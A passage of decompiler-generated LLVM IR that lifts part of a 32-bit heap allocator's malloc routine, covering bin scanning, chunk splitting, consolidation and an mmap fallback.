bb84:                                             ; preds = %dec_label_pc_804a44c, %bb
  %v5_804a45d = phi i32 [ 1, %dec_label_pc_804a44c ], [ %v5_804a45b, %bb ]
  %v1_804a45d = mul nsw i32 %v2_804a458, 4
  %v2_804a45d = add i32 %v1_804a45d, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a45d = inttoptr i32 %v2_804a45d to i32*
  %v4_804a45d = load i32, i32* %v3_804a45d, align 4
  %v6_804a45d = or i32 %v4_804a45d, %v5_804a45d
  store i32 %v6_804a45d, i32* %v3_804a45d, align 4
  %v0_804a464 = load i32, i32* @ebx, align 4
  %v1_804a464 = load i32, i32* @ebp, align 4
  %v2_804a464 = add i32 %v1_804a464, 12
  %v3_804a464 = inttoptr i32 %v2_804a464 to i32*
  store i32 %v0_804a464, i32* %v3_804a464, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804a46b = load i32, i32* @ebp, align 4
  %v2_804a46b = add i32 %v1_804a46b, 8
  %v3_804a46b = inttoptr i32 %v2_804a46b to i32*
  store i32 %stack_var_-64.1, i32* %v3_804a46b, align 4
  %v0_804a46e = load i32, i32* @ebp, align 4
  %v1_804a46e = load i32, i32* @ebx, align 4
  %v2_804a46e = add i32 %v1_804a46e, 8
  %v3_804a46e = inttoptr i32 %v2_804a46e to i32*
  store i32 %v0_804a46e, i32* %v3_804a46e, align 4
  %v0_804a471 = load i32, i32* @ebp, align 4
  %v1_804a471 = load i32, i32* @esi, align 4
  %v2_804a471 = add i32 %v1_804a471, 12
  %v3_804a471 = inttoptr i32 %v2_804a471 to i32*
  store i32 %v0_804a471, i32* %v3_804a471, align 4
  %v0_804a474 = load i32, i32* @global_var_8054640.41, align 64
  store i32 %v0_804a474, i32* @ebp, align 4
  %v9_804a47a = icmp eq i32 %v0_804a474, 134563380
  %v1_804a480 = icmp eq i1 %v9_804a47a, false
  br i1 %v1_804a480, label %dec_label_pc_804a3a3, label %dec_label_pc_804a486

dec_label_pc_804a486:                             ; preds = %bb84, %dec_label_pc_804a474.preheader
  br i1 %v8_804a337, label %dec_label_pc_804a514, label %dec_label_pc_804a494

dec_label_pc_804a494:                             ; preds = %dec_label_pc_804a486
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804a498 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804a498 = add i32 %v1_804a498, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a498, i32* %edx.global-to-local, align 4
  %v1_804a49f = add i32 %v1_804a498, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a49f = inttoptr i32 %v1_804a49f to i32*
  %storemerge1.pre = load i32, i32* %v2_804a49f, align 4
  br label %dec_label_pc_804a510

dec_label_pc_804a4a4:                             ; preds = %dec_label_pc_804a510
  %v1_804a4a4 = add i32 %v4_804a4bb, 4
  %v2_804a4a4 = inttoptr i32 %v1_804a4a4 to i32*
  %v3_804a4a4 = load i32, i32* %v2_804a4a4, align 4
  store i32 %v3_804a4a4, i32* %ebx.global-to-local, align 4
  %v1_804a4a7 = add i32 %v4_804a4bb, 12
  %v2_804a4a7 = inttoptr i32 %v1_804a4a7 to i32*
  %v3_804a4a7 = load i32, i32* %v2_804a4a7, align 4
  store i32 %v3_804a4a7, i32* @ecx, align 4
  %v1_804a4aa = and i32 %v3_804a4a4, -4
  store i32 %v1_804a4aa, i32* @ebx, align 4
  %v10_804a4ad = icmp ult i32 %v1_804a4aa, %v1_804a686
  br i1 %v10_804a4ad, label %dec_label_pc_804a510, label %dec_label_pc_804a4b3

dec_label_pc_804a4b3:                             ; preds = %dec_label_pc_804a4a4
  %v1_804a4b3 = add i32 %v4_804a4bb, 8
  %v2_804a4b3 = inttoptr i32 %v1_804a4b3 to i32*
  %v3_804a4b3 = load i32, i32* %v2_804a4b3, align 4
  store i32 %v3_804a4b3, i32* @edx, align 4
  %v1_804a4b6 = add i32 %v3_804a4b3, 12
  %v2_804a4b6 = inttoptr i32 %v1_804a4b6 to i32*
  %v3_804a4b6 = load i32, i32* %v2_804a4b6, align 4
  %v15_804a4b6 = icmp eq i32 %v3_804a4b6, %v4_804a4bb
  %v1_804a4b9 = icmp eq i1 %v15_804a4b6, false
  br i1 %v1_804a4b9, label %dec_label_pc_804a4c0, label %dec_label_pc_804a4bb

dec_label_pc_804a4bb:                             ; preds = %dec_label_pc_804a4b3
  %v1_804a4bb = add i32 %v3_804a4a7, 8
  %v2_804a4bb = inttoptr i32 %v1_804a4bb to i32*
  %v3_804a4bb = load i32, i32* %v2_804a4bb, align 4
  %v15_804a4bb = icmp eq i32 %v3_804a4bb, %v4_804a4bb
  br i1 %v15_804a4bb, label %dec_label_pc_804a4c5, label %dec_label_pc_804a4c0

dec_label_pc_804a4c0:                             ; preds = %dec_label_pc_804a4bb, %dec_label_pc_804a4b3
  %v0_804a4c0 = call i32 @abort()
  store i32 %v0_804a4c0, i32* %eax.global-to-local, align 4
  %v0_804a4c5.pre = load i32, i32* @ebx, align 4
  %v0_804a4cb.pre = load i32, i32* @ecx, align 4
  %v1_804a4cb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804a4c5

dec_label_pc_804a4c5:                             ; preds = %dec_label_pc_804a4bb, %dec_label_pc_804a4c0
  %v1_804a4cb = phi i32 [ %v3_804a4b3, %dec_label_pc_804a4bb ], [ %v1_804a4cb.pre, %dec_label_pc_804a4c0 ]
  %v0_804a4cb = phi i32 [ %v3_804a4a7, %dec_label_pc_804a4bb ], [ %v0_804a4cb.pre, %dec_label_pc_804a4c0 ]
  %v0_804a4c5 = phi i32 [ %v1_804a4aa, %dec_label_pc_804a4bb ], [ %v0_804a4c5.pre, %dec_label_pc_804a4c0 ]
  %v5_804a4c7 = sub i32 %v0_804a4c5, %v1_804a686
  store i32 %v5_804a4c7, i32* %esi.global-to-local, align 4
  %v2_804a4cb = add i32 %v1_804a4cb, 12
  %v3_804a4cb = inttoptr i32 %v2_804a4cb to i32*
  store i32 %v0_804a4cb, i32* %v3_804a4cb, align 4
  %v0_804a4ce = load i32, i32* @edx, align 4
  %v1_804a4ce = load i32, i32* @ecx, align 4
  %v2_804a4ce = add i32 %v1_804a4ce, 8
  %v3_804a4ce = inttoptr i32 %v2_804a4ce to i32*
  store i32 %v0_804a4ce, i32* %v3_804a4ce, align 4
  %v0_804a4d1 = load i32, i32* %esi.global-to-local, align 4
  %v0_804a4d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a4d4 = add i32 %v0_804a4d4, 8
  store i32 %v1_804a4d4, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_804a4d1, 16
  br i1 %tmp127, label %dec_label_pc_804a9d5, label %dec_label_pc_804a4dd

dec_label_pc_804a4dd:                             ; preds = %dec_label_pc_804a4c5
  %v2_804a4e1 = add i32 %v0_804a4d4, %v1_804a686
  store i32 %v2_804a4e1, i32* @edx, align 4
  %v1_804a4e4 = or i32 %v1_804a686, 1
  store i32 %v1_804a4e4, i32* %ebx.global-to-local, align 4
  %v2_804a4e7 = add i32 %v0_804a4d4, 4
  %v3_804a4e7 = inttoptr i32 %v2_804a4e7 to i32*
  store i32 %v1_804a4e4, i32* %v3_804a4e7, align 4
  %v0_804a4ea = load i32, i32* %esi.global-to-local, align 4
  %v1_804a4ec = or i32 %v0_804a4ea, 1
  store i32 %v1_804a4ec, i32* %eax.global-to-local, align 4
  %v0_804a4ef = load i32, i32* @edx, align 4
  %v1_804a4ef = load i32, i32* @ebp, align 4
  %v2_804a4ef = add i32 %v1_804a4ef, 8
  %v3_804a4ef = inttoptr i32 %v2_804a4ef to i32*
  store i32 %v0_804a4ef, i32* %v3_804a4ef, align 4
  %v0_804a4f2 = load i32, i32* @edx, align 4
  %v1_804a4f2 = load i32, i32* @ebp, align 4
  %v2_804a4f2 = add i32 %v1_804a4f2, 12
  %v3_804a4f2 = inttoptr i32 %v2_804a4f2 to i32*
  store i32 %v0_804a4f2, i32* %v3_804a4f2, align 4
  %v0_804a4f5 = load i32, i32* @edx, align 4
  %v1_804a4f5 = add i32 %v0_804a4f5, 8
  %v2_804a4f5 = inttoptr i32 %v1_804a4f5 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a4f5, align 4
  %v0_804a4fc = load i32, i32* @edx, align 4
  %v1_804a4fc = add i32 %v0_804a4fc, 12
  %v2_804a4fc = inttoptr i32 %v1_804a4fc to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a4fc, align 4
  %v0_804a503 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a503 = load i32, i32* @edx, align 4
  %v2_804a503 = add i32 %v1_804a503, 4
  %v3_804a503 = inttoptr i32 %v2_804a503 to i32*
  store i32 %v0_804a503, i32* %v3_804a503, align 4
  %v0_804a506 = load i32, i32* %esi.global-to-local, align 4
  %v1_804a506 = load i32, i32* @edx, align 4
  %v3_804a506 = add i32 %v1_804a506, %v0_804a506
  %v4_804a506 = inttoptr i32 %v3_804a506 to i32*
  store i32 %v0_804a506, i32* %v4_804a506, align 4
  br label %dec_label_pc_804a9da

dec_label_pc_804a510:                             ; preds = %dec_label_pc_804a4a4, %dec_label_pc_804a494
  %v4_804a4bb = phi i32 [ %storemerge1.pre, %dec_label_pc_804a494 ], [ %v3_804a4a7, %dec_label_pc_804a4a4 ]
  store i32 %v4_804a4bb, i32* %eax.global-to-local, align 4
  %v12_804a510 = icmp eq i32 %v4_804a4bb, %v2_804a498
  %v1_804a512 = icmp eq i1 %v12_804a510, false
  br i1 %v1_804a512, label %dec_label_pc_804a4a4, label %dec_label_pc_804a514.loopexit

dec_label_pc_804a514.loopexit:                    ; preds = %dec_label_pc_804a510
  br label %dec_label_pc_804a514

dec_label_pc_804a514:                             ; preds = %dec_label_pc_804a514.loopexit, %dec_label_pc_804a486
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804a51d = add i32 %stack_var_-40.0.ph, 1
  %v2_804a520 = udiv i32 %v1_804a51d, 32
  store i32 %v2_804a520, i32* @edi, align 4
  %v1_804a523 = mul i32 %v1_804a51d, 8
  %v2_804a523 = add i32 %v1_804a523, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a523, i32* %ebx.global-to-local, align 4
  %v1_804a52a = urem i32 %v1_804a51d, 32
  %v2_804a52a = icmp eq i32 %v1_804a52a, 0
  store i32 %v1_804a52a, i32* %ecx.global-to-local, align 4
  %v1_804a52d = mul nuw nsw i32 %v2_804a520, 4
  %v2_804a52d = add i32 %v1_804a52d, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a52d = inttoptr i32 %v2_804a52d to i32*
  %v4_804a52d = load i32, i32* %v3_804a52d, align 4
  store i32 %v4_804a52d, i32* %edx.global-to-local, align 4
  br i1 %v2_804a52a, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_804a514
  %v5_804a534 = shl i32 1, %v1_804a52a
  store i32 %v5_804a534, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804a514, %bb85, %dec_label_pc_804a575
  %v1_804a536 = phi i32 [ %v1_804a536.pre, %dec_label_pc_804a575 ], [ %v4_804a52d, %bb85 ], [ %v4_804a52d, %dec_label_pc_804a514 ]
  %v0_804a53a = phi i32 [ %v0_804a536.pre, %dec_label_pc_804a575 ], [ %v5_804a534, %bb85 ], [ 1, %dec_label_pc_804a514 ]
  %tmp86 = icmp ule i32 %v0_804a53a, %v1_804a536
  %v1_804a53a = icmp eq i32 %v0_804a53a, 0
  %v1_804a53c = icmp eq i1 %v1_804a53a, false
  %or.cond = and i1 %tmp86, %v1_804a53c
  br i1 %or.cond, label %dec_label_pc_804a53a.dec_label_pc_804a56a.preheader_crit_edge, label %dec_label_pc_804a53e.preheader

dec_label_pc_804a53a.dec_label_pc_804a56a.preheader_crit_edge: ; preds = %.preheader
  %v0_804a56512.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a56a.preheader

dec_label_pc_804a53e.preheader:                   ; preds = %.preheader
  %v0_804a53e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804a53e

dec_label_pc_804a53e:                             ; preds = %dec_label_pc_804a53e.preheader, %dec_label_pc_804a548
  %v0_804a53e = phi i32 [ %v0_804a53e.pre, %dec_label_pc_804a53e.preheader ], [ %v1_804a53e, %dec_label_pc_804a548 ]
  %v1_804a53e = add i32 %v0_804a53e, 1
  store i32 %v1_804a53e, i32* @edi, align 4
  %v6_804a542 = icmp ugt i32 %v1_804a53e, 2
  br i1 %v6_804a542, label %dec_label_pc_804a5f1.loopexit, label %dec_label_pc_804a548

dec_label_pc_804a548:                             ; preds = %dec_label_pc_804a53e
  %v1_804a548 = mul i32 %v1_804a53e, 4
  %v2_804a548 = add i32 %v1_804a548, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a548 = inttoptr i32 %v2_804a548 to i32*
  %v4_804a548 = load i32, i32* %v3_804a548, align 4
  store i32 %v4_804a548, i32* %edx.global-to-local, align 4
  %v1_804a54f = icmp eq i32 %v4_804a548, 0
  br i1 %v1_804a54f, label %dec_label_pc_804a53e, label %dec_label_pc_804a553

dec_label_pc_804a553:                             ; preds = %dec_label_pc_804a548
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804a55a = mul i32 %v1_804a53e, 256
  store i32 %v2_804a55a, i32* %eax.global-to-local, align 4
  %v1_804a55d = add i32 %v2_804a55a, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v1_804a55d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a56a.preheader

dec_label_pc_804a56a.preheader:                   ; preds = %dec_label_pc_804a53a.dec_label_pc_804a56a.preheader_crit_edge, %dec_label_pc_804a553
  %v0_804a56512 = phi i32 [ %v1_804a55d, %dec_label_pc_804a553 ], [ %v0_804a56512.pre, %dec_label_pc_804a53a.dec_label_pc_804a56a.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804a553 ], [ %v0_804a53a, %dec_label_pc_804a53a.dec_label_pc_804a56a.preheader_crit_edge ]
  %v0_804a57c = phi i32 [ %v4_804a548, %dec_label_pc_804a553 ], [ %v1_804a536, %dec_label_pc_804a53a.dec_label_pc_804a56a.preheader_crit_edge ]
  %v2_804a56a4 = and i32 %v0_804a57c, %esi.promoted
  %v3_804a56a5 = icmp eq i32 %v2_804a56a4, 0
  br i1 %v3_804a56a5, label %dec_label_pc_804a565, label %dec_label_pc_804a56e

dec_label_pc_804a565:                             ; preds = %dec_label_pc_804a56a.preheader, %dec_label_pc_804a565
  %v2_804a56814 = phi i32 [ %v2_804a568, %dec_label_pc_804a565 ], [ %esi.promoted, %dec_label_pc_804a56a.preheader ]
  %v0_804a56513 = phi i32 [ %v1_804a565, %dec_label_pc_804a565 ], [ %v0_804a56512, %dec_label_pc_804a56a.preheader ]
  %v1_804a565 = add i32 %v0_804a56513, 8
  %v2_804a568 = mul i32 %v2_804a56814, 2
  %v2_804a56a = and i32 %v2_804a568, %v0_804a57c
  %v3_804a56a = icmp eq i32 %v2_804a56a, 0
  br i1 %v3_804a56a, label %dec_label_pc_804a565, label %dec_label_pc_804a56a.dec_label_pc_804a56e_crit_edge

dec_label_pc_804a56a.dec_label_pc_804a56e_crit_edge: ; preds = %dec_label_pc_804a565
  store i32 %v1_804a565, i32* %ebx.global-to-local, align 4
  store i32 %v2_804a568, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a56e

dec_label_pc_804a56e:                             ; preds = %dec_label_pc_804a56a.dec_label_pc_804a56e_crit_edge, %dec_label_pc_804a56a.preheader
  %v0_804a57e = phi i32 [ %v2_804a568, %dec_label_pc_804a56a.dec_label_pc_804a56e_crit_edge ], [ %esi.promoted, %dec_label_pc_804a56a.preheader ]
  %v1_804a598 = phi i32 [ %v1_804a565, %dec_label_pc_804a56a.dec_label_pc_804a56e_crit_edge ], [ %v0_804a56512, %dec_label_pc_804a56a.preheader ]
  %v1_804a56e = add i32 %v1_804a598, 12
  %v2_804a56e = inttoptr i32 %v1_804a56e to i32*
  %v3_804a56e = load i32, i32* %v2_804a56e, align 4
  store i32 %v3_804a56e, i32* @ecx, align 4
  %v12_804a571 = icmp eq i32 %v3_804a56e, %v1_804a598
  %v1_804a573 = icmp eq i1 %v12_804a571, false
  br i1 %v1_804a573, label %dec_label_pc_804a589, label %dec_label_pc_804a575

dec_label_pc_804a575:                             ; preds = %dec_label_pc_804a56e
  %v1_804a577 = add i32 %v3_804a56e, 8
  store i32 %v1_804a577, i32* %ebx.global-to-local, align 4
  %v1_804a57a = sub i32 -1, %v0_804a57e
  store i32 %v1_804a57a, i32* %eax.global-to-local, align 4
  %v2_804a57c = and i32 %v0_804a57c, %v1_804a57a
  store i32 %v2_804a57c, i32* %edx.global-to-local, align 4
  %v2_804a57e = mul i32 %v0_804a57e, 2
  store i32 %v2_804a57e, i32* %esi.global-to-local, align 4
  %v1_804a580 = load i32, i32* @edi, align 4
  %v2_804a580 = mul i32 %v1_804a580, 4
  %v3_804a580 = add i32 %v2_804a580, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v4_804a580 = inttoptr i32 %v3_804a580 to i32*
  store i32 %v2_804a57c, i32* %v4_804a580, align 4
  %v0_804a536.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804a536.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804a589:                             ; preds = %dec_label_pc_804a56e
  %v1_804a589 = add i32 %v3_804a56e, 4
  %v2_804a589 = inttoptr i32 %v1_804a589 to i32*
  %v3_804a589 = load i32, i32* %v2_804a589, align 4
  store i32 %v3_804a589, i32* %edx.global-to-local, align 4
  %v1_804a58c = add i32 %v3_804a56e, 12
  %v2_804a58c = inttoptr i32 %v1_804a58c to i32*
  %v3_804a58c = load i32, i32* %v2_804a58c, align 4
  store i32 %v3_804a58c, i32* %eax.global-to-local, align 4
  %v1_804a58f = and i32 %v3_804a589, -4
  store i32 %v1_804a58f, i32* @edx, align 4
  %v5_804a594 = sub i32 %v1_804a58f, %v1_804a686
  store i32 %v5_804a594, i32* %esi.global-to-local, align 4
  store i32 %v3_804a58c, i32* %v2_804a56e, align 4
  %v0_804a59b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a59b = load i32, i32* %eax.global-to-local, align 4
  %v2_804a59b = add i32 %v1_804a59b, 8
  %v3_804a59b = inttoptr i32 %v2_804a59b to i32*
  store i32 %v0_804a59b, i32* %v3_804a59b, align 4
  %v0_804a59e = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_804a59e, 16
  br i1 %tmp128, label %dec_label_pc_804a5a3, label %dec_label_pc_804a5aa

dec_label_pc_804a5a3:                             ; preds = %dec_label_pc_804a589
  %v0_804a5a3 = load i32, i32* @ecx, align 4
  %v1_804a5a3 = load i32, i32* @edx, align 4
  %v2_804a5a3 = add i32 %v0_804a5a3, 4
  %v3_804a5a3 = add i32 %v2_804a5a3, %v1_804a5a3
  %v4_804a5a3 = inttoptr i32 %v3_804a5a3 to i32*
  %v5_804a5a3 = load i32, i32* %v4_804a5a3, align 4
  %v6_804a5a3 = or i32 %v5_804a5a3, 1
  store i32 %v6_804a5a3, i32* %v4_804a5a3, align 4
  br label %dec_label_pc_804a5e9

dec_label_pc_804a5aa:                             ; preds = %dec_label_pc_804a589
  store i32 %v1_804a686, i32* %eax.global-to-local, align 4
  %v0_804a5b3 = load i32, i32* @ecx, align 4
  %v2_804a5b3 = add i32 %v0_804a5b3, %v1_804a686
  store i32 %v2_804a5b3, i32* @edx, align 4
  %v1_804a5b6 = load i32, i32* @ebp, align 4
  %v2_804a5b6 = add i32 %v1_804a5b6, 8
  %v3_804a5b6 = inttoptr i32 %v2_804a5b6 to i32*
  store i32 %v2_804a5b3, i32* %v3_804a5b6, align 4
  %v0_804a5b9 = load i32, i32* @edx, align 4
  %v1_804a5b9 = load i32, i32* @ebp, align 4
  %v2_804a5b9 = add i32 %v1_804a5b9, 12
  %v3_804a5b9 = inttoptr i32 %v2_804a5b9 to i32*
  store i32 %v0_804a5b9, i32* %v3_804a5b9, align 4
  %v0_804a5bc = load i32, i32* @edx, align 4
  %v1_804a5bc = add i32 %v0_804a5bc, 8
  %v2_804a5bc = inttoptr i32 %v1_804a5bc to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a5bc, align 4
  %v0_804a5c3 = load i32, i32* @edx, align 4
  %v1_804a5c3 = add i32 %v0_804a5c3, 12
  %v2_804a5c3 = inttoptr i32 %v1_804a5c3 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a5c3, align 4
  br i1 %v6_804a33f, label %dec_label_pc_804a5d2, label %dec_label_pc_804a5cc

dec_label_pc_804a5cc:                             ; preds = %dec_label_pc_804a5aa
  %v0_804a5cc = load i32, i32* @edx, align 4
  store i32 %v0_804a5cc, i32* @global_var_8054630.39, align 16
  br label %dec_label_pc_804a5d2

dec_label_pc_804a5d2:                             ; preds = %dec_label_pc_804a5aa, %dec_label_pc_804a5cc
  %v4_804a5d2 = or i32 %v1_804a686, 1
  %v0_804a5d7 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804a5d2, i32* %ebx.global-to-local, align 4
  %v1_804a5dd = or i32 %v0_804a5d7, 1
  store i32 %v1_804a5dd, i32* %eax.global-to-local, align 4
  %v1_804a5e0 = load i32, i32* @ecx, align 4
  %v2_804a5e0 = add i32 %v1_804a5e0, 4
  %v3_804a5e0 = inttoptr i32 %v2_804a5e0 to i32*
  store i32 %v4_804a5d2, i32* %v3_804a5e0, align 4
  %v0_804a5e3 = load i32, i32* %esi.global-to-local, align 4
  %v1_804a5e3 = load i32, i32* @edx, align 4
  %v3_804a5e3 = add i32 %v1_804a5e3, %v0_804a5e3
  %v4_804a5e3 = inttoptr i32 %v3_804a5e3 to i32*
  store i32 %v0_804a5e3, i32* %v4_804a5e3, align 4
  %v0_804a5e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a5e6 = load i32, i32* @edx, align 4
  %v2_804a5e6 = add i32 %v1_804a5e6, 4
  %v3_804a5e6 = inttoptr i32 %v2_804a5e6 to i32*
  store i32 %v0_804a5e6, i32* %v3_804a5e6, align 4
  br label %dec_label_pc_804a5e9

dec_label_pc_804a5e9:                             ; preds = %dec_label_pc_804a5a3, %dec_label_pc_804a5d2
  %v0_804a5e9 = load i32, i32* @ecx, align 4
  %v1_804a5e9 = add i32 %v0_804a5e9, 8
  store i32 %v1_804a5e9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a9eb

dec_label_pc_804a5f1.loopexit:                    ; preds = %dec_label_pc_804a53e
  br label %dec_label_pc_804a5f1

dec_label_pc_804a5f1:                             ; preds = %dec_label_pc_804a5f1.loopexit, %dec_label_pc_804a2f9, %dec_label_pc_804a301
  %v0_804a5f1 = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804a5f1, i32* @ebx, align 4
  %v1_804a5fb = add i32 %v1_804a686, 16
  store i32 %v1_804a5fb, i32* @esi, align 4
  %v1_804a5fe = add i32 %v0_804a5f1, 4
  %v2_804a5fe = inttoptr i32 %v1_804a5fe to i32*
  %v3_804a5fe = load i32, i32* %v2_804a5fe, align 4
  %v1_804a605 = and i32 %v3_804a5fe, -4
  store i32 %v1_804a605, i32* %ecx.global-to-local, align 4
  %v7_804a608 = icmp ult i32 %v1_804a605, %v1_804a5fb
  br i1 %v7_804a608, label %dec_label_pc_804a628, label %dec_label_pc_804a60c

dec_label_pc_804a60c:                             ; preds = %dec_label_pc_804a5f1
  %v2_804a610 = add i32 %v0_804a5f1, %v1_804a686
  store i32 %v2_804a610, i32* @edx, align 4
  %v1_804a613 = or i32 %v1_804a686, 1
  store i32 %v1_804a613, i32* %eax.global-to-local, align 4
  store i32 %v2_804a610, i32* @global_var_805462c.38, align 4
  store i32 %v1_804a613, i32* %v2_804a5fe, align 4
  %v0_804a61f = load i32, i32* %ecx.global-to-local, align 4
  %v5_804a61f = sub i32 %v0_804a61f, %v1_804a686
  store i32 %v5_804a61f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804a97b

dec_label_pc_804a628:                             ; preds = %dec_label_pc_804a5f1
  %v0_804a628 = load i32, i32* @global_var_805495c.43, align 4
  store i32 %v0_804a628, i32* %edx.global-to-local, align 4
  %v0_804a62e = load i8, i8* @global_var_8054600.37, align 512
  %v1_804a62e = and i8 %v0_804a62e, 2
  %v2_804a62e = icmp eq i8 %v1_804a62e, 0
  br i1 %v2_804a62e, label %dec_label_pc_804a65c, label %dec_label_pc_804a637

dec_label_pc_804a637:                             ; preds = %dec_label_pc_804a628
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a63f = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @ebx, align 4
  %v1_804a649 = add i32 %v1_804a686, -7
  store i32 %v1_804a649, i32* %eax.global-to-local, align 4
  store i32 %v1_804a649, i32* %stack_var_-92, align 4
  %v1_804a64d = call i32 @malloc(i32 %v1_804a649)
  store i32 %v1_804a64d, i32* %eax.global-to-local, align 4
  store i32 %v1_804a64d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a9eb

dec_label_pc_804a65c:                             ; preds = %dec_label_pc_804a628
  %v1_804a65c = add i32 %v0_804a628, -1
  store i32 %v1_804a65c, i32* @ecx, align 4
  store i32 %v1_804a686, i32* @ebx, align 4
  %v1_804a667 = load i32, i32* @global_var_805494c.44, align 4
  %v7_804a667 = icmp ult i32 %v1_804a686, %v1_804a667
  br i1 %v7_804a667, label %dec_label_pc_804a729, label %dec_label_pc_804a673

dec_label_pc_804a673:                             ; preds = %dec_label_pc_804a65c
  %v0_804a673 = load i32, i32* @global_var_8054950.45, align 16
  store i32 %v0_804a673, i32* %eax.global-to-local, align 4
  %v1_804a678 = load i32, i32* @global_var_8054954.46, align 4
  %v5_804a67e = icmp slt i32 %v0_804a673, %v1_804a678
  br i1 %v5_804a67e, label %dec_label_pc_804a684, label %dec_label_pc_804a729

dec_label_pc_804a684:                             ; preds = %dec_label_pc_804a673
  %v2_804a686 = add i32 %v1_804a686, 10
  %v3_804a686 = add i32 %v2_804a686, %v0_804a628
  %v1_804a68a = sub i32 0, %v0_804a628
  store i32 %v1_804a68a, i32* %eax.global-to-local, align 4
  %v2_804a68c = and i32 %v3_804a686, %v1_804a68a
  store i32 %v2_804a68c, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_804a68c, %v1_804a686
  br i1 %tmp129, label %dec_label_pc_804a698, label %dec_label_pc_804a729

dec_label_pc_804a698:                             ; preds = %dec_label_pc_804a684
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804a6a5 = call i32 @mmap(i32 0, i32 %v2_804a68c, i32 3, i32 34, i32 0, i32 0, i32 %v1_804a65c, i32 %v1_804a65c)
  store i32 %v8_804a6a5, i32* %eax.global-to-local, align 4
  store i32 %v8_804a6a5, i32* @edx, align 4
  %v10_804a6af = icmp eq i32 %v8_804a6a5, -1
  br i1 %v10_804a6af, label %dec_label_pc_804a698.dec_label_pc_804a729_crit_edge, label %dec_label_pc_804a6b4

dec_label_pc_804a698.dec_label_pc_804a729_crit_edge: ; preds = %dec_label_pc_804a698
  %v0_804a729.pre = load i32, i32* @global_var_805462c.38, align 4
  br label %dec_label_pc_804a729

dec_label_pc_804a6b4:                             ; preds = %dec_label_pc_804a698
  %v1_804a6b6 = urem i32 %v8_804a6a5, 8
  %v2_804a6b6 = icmp eq i32 %v1_804a6b6, 0
  store i32 %v1_804a6b6, i32* @ecx, align 4
  br i1 %v2_804a6b6, label %dec_label_pc_804a6ce, label %dec_label_pc_804a6bb

dec_label_pc_804a6bb:                             ; preds = %dec_label_pc_804a6b4
  %v0_804a6c0 = load i32, i32* @ebx, align 4
  %v2_804a6c2 = sub nsw i32 8, %v1_804a6b6
  store i32 %v2_804a6c2, i32* %eax.global-to-local, align 4
  %v2_804a6c4 = add i32 %v2_804a6c2, %v8_804a6a5
  store i32 %v2_804a6c4, i32* @edx, align 4
  %v2_804a6c6 = sub i32 %v0_804a6c0, %v2_804a6c2
  store i32 %v2_804a6c6, i32* %esi.global-to-local, align 4
  %v2_804a6c8 = inttoptr i32 %v2_804a6c4 to i32*
  store i32 %v2_804a6c2, i32* %v2_804a6c8, align 4
  br label %dec_label_pc_804a6d6

dec_label_pc_804a6ce:                             ; preds = %dec_label_pc_804a6b4
  %v1_804a6ce = inttoptr i32 %v8_804a6a5 to i32*
  store i32 0, i32* %v1_804a6ce, align 4
  br label %dec_label_pc_804a6d6

dec_label_pc_804a6d6:                             ; preds = %dec_label_pc_804a6bb, %dec_label_pc_804a6ce
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804a6bb ], [ @ebx, %dec_label_pc_804a6ce ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804a6d6 = or i32 %storemerge, 2
  %v1_804a6d9 = load i32, i32* @edx, align 4
  %v2_804a6d9 = add i32 %v1_804a6d9, 4
  %v3_804a6d9 = inttoptr i32 %v2_804a6d9 to i32*
  store i32 %v1_804a6d6, i32* %v3_804a6d9, align 4
  %v0_804a6dc = load i32, i32* @global_var_8054950.45, align 16
  %v1_804a6e1 = add i32 %v0_804a6dc, 1
  store i32 %v1_804a6e1, i32* %eax.global-to-local, align 4
  store i32 %v1_804a6e1, i32* @global_var_8054950.45, align 16
  %v1_804a6e7 = load i32, i32* @global_var_8054958.47, align 8
